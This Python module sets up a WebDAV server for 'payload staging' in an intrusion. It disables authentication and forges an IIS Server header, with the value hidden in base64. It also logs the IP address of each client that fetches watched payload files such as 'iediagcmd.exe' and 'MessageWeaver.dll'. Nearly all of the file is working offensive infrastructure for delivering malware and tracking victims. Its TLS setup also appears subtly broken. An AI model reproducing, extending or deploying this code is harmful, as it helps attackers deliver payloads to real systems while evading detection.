# webdav_server.py
# Module for launching a lightweight WebDAV server for payload staging.

import os
import base64
import ssl
import time
from cheroot import wsgi
from wsgidav.wsgidav_app import WsgiDAVApp

class HeaderSpoofMiddleware:
    """Middleware to spoof the 'Server' HTTP header."""
    def __init__(self, app, server_tag_b64="TWljcm9zb2Z0LUlJUy8xMC4w"): # "Microsoft-IIS/10.0"
        self.app = app
        self.server_tag = base64.b64decode(server_tag_b64).decode('utf-8')

    def __call__(self, environ, start_response):
        def custom_start_response(status, headers, exc_info=None):
            # Filter out the original server header and add the spoofed one
            new_headers = [h for h in headers if h[0].lower() != 'server']
            new_headers.append(('Server', self.server_tag))
            return start_response(status, new_headers, exc_info)
        return self.app(environ, custom_start_response)

class IntelMiddleware:
    """Middleware to log requests for critical assets, providing real-time feedback."""
    def __init__(self, app, watch_list=None):
        self.app = app
        # Default watch list for common payload names
        self.watch = watch_list or ['/reports/iediagcmd.exe', '/reports/MessageWeaver.dll']

    def __call__(self, environ, start_response):
        path = environ.get('PATH_INFO', '')
        if path in self.watch:
            ts = time.strftime('%Y-%m-%d %H:%M:%S', time.gmtime())
            remote_ip = environ.get('REMOTE_ADDR', '?.?.?.?')
            log_msg = f"[{ts} GMT] SIG_HIT: {remote_ip} -> {path}"
            # Print to stdout, which can be captured by a TUI's log panel
            print(log_msg)

        return self.app(environ, start_response)

class DAVServer:
    """A configurable WebDAV server with security and intelligence middleware."""
    def __init__(self, root_path: str, host: str, port: int, use_tls: bool = False, verbose: bool = True):
        if not os.path.exists(root_path):
            print(f"[*] Server root path '{root_path}' does not exist. Creating it.")
            os.makedirs(root_path)

        self.host = host
        self.port = port
        self.config = {
            "provider_mapping": {"/": root_path},
            "verbose": 1 if verbose else 0,
            "http_authenticator": {
                "domain_controller": None,  # Authentication disabled for this use case
            },
            "dir_browser": {"enable": True},
        }

        # Chain the middleware: Intel -> Header Spoofing -> Main App
        wsgidav_app = WsgiDAVApp(self.config)
        self.app = IntelMiddleware(HeaderSpoofMiddleware(wsgidav_app))

        self.server = wsgi.Server((self.host, self.port), self.app)

        # Configure SSL/TLS if requested
        if use_tls:
            try:
                ctx = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
                # Assumes cert.pem and key.pem are in the same directory
                ctx.load_cert_chain('cert.pem', 'key.pem')
                self.server.ssl_adapter = ctx
                print("[*] TLS/SSL is enabled.")
            except FileNotFoundError:
                print("[!] Error: --tls flag is set, but 'cert.pem' or 'key.pem' not found.")
                print("[!] Please generate certificates or disable TLS.")
                # We can decide to exit here or let the server start without TLS
                # For now, we'll let it continue without TLS and let the user know.
                self.server.ssl_adapter = None # Ensure it's None
        
        protocol = "https" if use_tls and self.server.ssl_adapter else "http"
        print(f"[*] WebDAV server configured to serve files from: {os.path.abspath(root_path)}")
        print(f"[*] Ready to start server on {protocol}://{self.host}:{self.port}")


    def start(self):
        """Starts the Cheroot WSGI server."""
        protocol = "https" if self.server.ssl_adapter else "http"
        print(f"[*] Starting WebDAV server on {protocol}://{self.host}:{self.port}...")
        try:
            self.server.start()
        except KeyboardInterrupt:
            print("\n[*] User interrupted. Stopping server.")
            self.server.stop()
        except Exception as e:
            # Provide more specific error for common issues like permissions
            if "Permission denied" in str(e) and self.port < 1024:
                 print(f"[!] Critical Error: Permission denied to bind to port {self.port}. Try running with sudo or use a port > 1023.")
            else:
                print(f"[!] Server failed to start: {e}")